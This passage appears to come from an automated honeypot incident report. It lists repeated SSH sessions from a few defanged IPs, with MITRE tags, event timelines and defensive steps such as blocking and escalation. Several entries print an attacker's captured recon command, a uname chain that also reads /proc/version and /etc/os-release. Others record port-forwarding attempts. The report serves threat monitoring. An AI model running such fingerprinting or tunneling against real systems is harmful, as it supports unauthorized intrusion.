| `2026-09-03 15:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9db2d5d0f60

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-03 15:47 |
| **Last Seen** | 2026-09-03 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:47:02` | `cowrie.session.connect` |
| `2026-09-03 15:47:02` | `cowrie.client.version` |
| `2026-09-03 15:47:02` | `cowrie.client.kex` |
| `2026-09-03 15:47:02` | `cowrie.login.success` |
| `2026-09-03 15:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adae058ec337

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-03 15:47 |
| **Last Seen** | 2026-09-03 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:47:05` | `cowrie.session.connect` |
| `2026-09-03 15:47:05` | `cowrie.client.version` |
| `2026-09-03 15:47:05` | `cowrie.client.kex` |
| `2026-09-03 15:47:06` | `cowrie.login.success` |
| `2026-09-03 15:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507c71075b53

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-03 15:47 |
| **Last Seen** | 2026-09-03 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:47:12` | `cowrie.session.connect` |
| `2026-09-03 15:47:12` | `cowrie.client.version` |
| `2026-09-03 15:47:13` | `cowrie.client.kex` |
| `2026-09-03 15:47:13` | `cowrie.login.success` |
| `2026-09-03 15:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9267aa2620f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:49 |
| **Last Seen** | 2026-09-03 15:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:49:00` | `cowrie.session.connect` |
| `2026-09-03 15:49:00` | `cowrie.client.version` |
| `2026-09-03 15:49:00` | `cowrie.client.kex` |
| `2026-09-03 15:49:03` | `cowrie.login.success` |
| `2026-09-03 15:49:03` | `cowrie.session.params` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.success` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:03` | `cowrie.command.input` |
| `2026-09-03 15:49:04` | `cowrie.log.closed` |
| `2026-09-03 15:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4edc437d8b99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:51 |
| **Last Seen** | 2026-09-03 15:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:51:13` | `cowrie.session.connect` |
| `2026-09-03 15:51:13` | `cowrie.client.version` |
| `2026-09-03 15:51:13` | `cowrie.client.kex` |
| `2026-09-03 15:51:14` | `cowrie.login.success` |
| `2026-09-03 15:51:15` | `cowrie.session.params` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.success` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.command.input` |
| `2026-09-03 15:51:15` | `cowrie.log.closed` |
| `2026-09-03 15:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6c4d27eb6f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:53 |
| **Last Seen** | 2026-09-03 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:53:08` | `cowrie.session.connect` |
| `2026-09-03 15:53:08` | `cowrie.client.version` |
| `2026-09-03 15:53:08` | `cowrie.client.kex` |
| `2026-09-03 15:53:09` | `cowrie.login.success` |
| `2026-09-03 15:53:09` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:53:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:53:09` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57938e94917f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:53 |
| **Last Seen** | 2026-09-03 15:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:53:24` | `cowrie.session.connect` |
| `2026-09-03 15:53:25` | `cowrie.client.version` |
| `2026-09-03 15:53:25` | `cowrie.client.kex` |
| `2026-09-03 15:53:26` | `cowrie.login.success` |
| `2026-09-03 15:53:27` | `cowrie.session.params` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.success` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:27` | `cowrie.command.input` |
| `2026-09-03 15:53:28` | `cowrie.log.closed` |
| `2026-09-03 15:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc8d73b20b0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:54 |
| **Last Seen** | 2026-09-03 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:54:41` | `cowrie.session.connect` |
| `2026-09-03 15:54:41` | `cowrie.client.version` |
| `2026-09-03 15:54:41` | `cowrie.client.kex` |
| `2026-09-03 15:54:42` | `cowrie.login.success` |
| `2026-09-03 15:54:42` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:54:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:54:42` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91cfb673c32e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:55 |
| **Last Seen** | 2026-09-03 15:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:55:38` | `cowrie.session.connect` |
| `2026-09-03 15:55:38` | `cowrie.client.version` |
| `2026-09-03 15:55:38` | `cowrie.client.kex` |
| `2026-09-03 15:55:40` | `cowrie.login.success` |
| `2026-09-03 15:55:41` | `cowrie.session.params` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.success` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.command.input` |
| `2026-09-03 15:55:41` | `cowrie.log.closed` |
| `2026-09-03 15:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55487dfad922

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:57 |
| **Last Seen** | 2026-09-03 15:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:57:49` | `cowrie.session.connect` |
| `2026-09-03 15:57:49` | `cowrie.client.version` |
| `2026-09-03 15:57:49` | `cowrie.client.kex` |
| `2026-09-03 15:57:51` | `cowrie.login.success` |
| `2026-09-03 15:57:52` | `cowrie.session.params` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.success` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:52` | `cowrie.command.input` |
| `2026-09-03 15:57:53` | `cowrie.log.closed` |
| `2026-09-03 15:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b244730a60bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:00 |
| **Last Seen** | 2026-09-03 16:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:00:07` | `cowrie.session.connect` |
| `2026-09-03 16:00:07` | `cowrie.client.version` |
| `2026-09-03 16:00:07` | `cowrie.client.kex` |
| `2026-09-03 16:00:08` | `cowrie.login.success` |
| `2026-09-03 16:00:10` | `cowrie.session.params` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.success` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.command.input` |
| `2026-09-03 16:00:10` | `cowrie.log.closed` |
| `2026-09-03 16:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e11304cdfe0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:02 |
| **Last Seen** | 2026-09-03 16:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:02:33` | `cowrie.session.connect` |
| `2026-09-03 16:02:33` | `cowrie.client.version` |
| `2026-09-03 16:02:33` | `cowrie.client.kex` |
| `2026-09-03 16:02:34` | `cowrie.login.success` |
| `2026-09-03 16:02:35` | `cowrie.session.params` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.success` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.command.input` |
| `2026-09-03 16:02:35` | `cowrie.log.closed` |
| `2026-09-03 16:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab663a4f59e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:03 |
| **Last Seen** | 2026-09-03 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:03:55` | `cowrie.session.connect` |
| `2026-09-03 16:03:55` | `cowrie.client.version` |
| `2026-09-03 16:03:55` | `cowrie.client.kex` |
| `2026-09-03 16:03:56` | `cowrie.login.success` |
| `2026-09-03 16:03:56` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:03:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:03:56` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6259b7d171f4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:04 |
| **Last Seen** | 2026-09-03 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:04:16` | `cowrie.session.connect` |
| `2026-09-03 16:04:16` | `cowrie.client.version` |
| `2026-09-03 16:04:16` | `cowrie.client.kex` |
| `2026-09-03 16:04:17` | `cowrie.login.success` |
| `2026-09-03 16:04:17` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:04:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:04:17` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edb9e11be9ba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:04 |
| **Last Seen** | 2026-09-03 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:04:55` | `cowrie.session.connect` |
| `2026-09-03 16:04:55` | `cowrie.client.version` |
| `2026-09-03 16:04:55` | `cowrie.client.kex` |
| `2026-09-03 16:04:57` | `cowrie.login.success` |
| `2026-09-03 16:04:58` | `cowrie.session.params` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.success` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.command.input` |
| `2026-09-03 16:04:58` | `cowrie.log.closed` |
| `2026-09-03 16:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b763bfb789c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:07 |
| **Last Seen** | 2026-09-03 16:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:07:10` | `cowrie.session.connect` |
| `2026-09-03 16:07:10` | `cowrie.client.version` |
| `2026-09-03 16:07:10` | `cowrie.client.kex` |
| `2026-09-03 16:07:11` | `cowrie.login.success` |
| `2026-09-03 16:07:12` | `cowrie.session.params` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.success` |
